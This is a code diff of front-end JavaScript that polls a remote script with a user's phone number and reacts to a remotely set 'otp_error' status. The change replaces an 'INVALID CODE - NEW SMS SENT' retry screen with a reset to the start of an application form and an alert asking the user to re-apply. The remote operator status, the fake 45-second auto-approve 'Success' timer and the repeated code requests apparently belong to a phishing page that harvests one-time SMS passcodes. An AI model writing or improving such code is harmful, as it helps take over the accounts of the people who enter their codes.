@@ -198,36 +198,26 @@ async function startPolling(phone) {
             }
 
             if (status === "otp_error" && !isResetting) {
-                isResetting = true; // Lock to prevent double-triggering
+    isResetting = true;
 
-                // 1. Clear the error from the script immediately
-                fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
+    // 1. Kill all active timers and auto-approvals
+    if (otpInterval) clearInterval(otpInterval);
+    if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
 
-                // 2. Kill the 45-second "Success" timer
-                if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
+    // 2. Tell the script to clear the error so they can re-apply fresh
+    await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(phone)}&cmd=clear`);
 
-                // 3. Reset UI with communication
-                const timerEl = document.getElementById('timer');
-                const btn = document.getElementById('otp-btn');
-                
-                timerEl.style.color = "yellow";
-                timerEl.innerText = "INVALID CODE - NEW SMS SENT";
-                
-                // Vibrate if mobile
-                if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+    // 3. Optional: Clear the form inputs so they start with a blank slate
+    // document.getElementById('application-form').reset(); 
 
-                document.querySelectorAll('.otp-input').forEach(input => input.value = "");
-                btn.innerText = "Confirm & Finish";
-                btn.disabled = false;
+    // 4. TAKE BACK TO START
+    showView(1); 
 
-                // 4. Restart Countdown & Unlock
-                setTimeout(() => {
-                    timerEl.style.color = "white";
-                    runCountdown(30);
-                    isResetting = false; 
-                }, 2000);
-                fetch(`${SCRIPT_URL}?num=${cleanID}&cmd=clear`);
-            }
+    // 5. Visual feedback (Toast or Alert)
+    alert("❌ Verification Failed: The code entered was incorrect. Please verify your details and re-apply.");
+
+    isResetting = false;
+}
         } catch (e) {
             console.error("DEBUG: Connection Failed", e);
         }
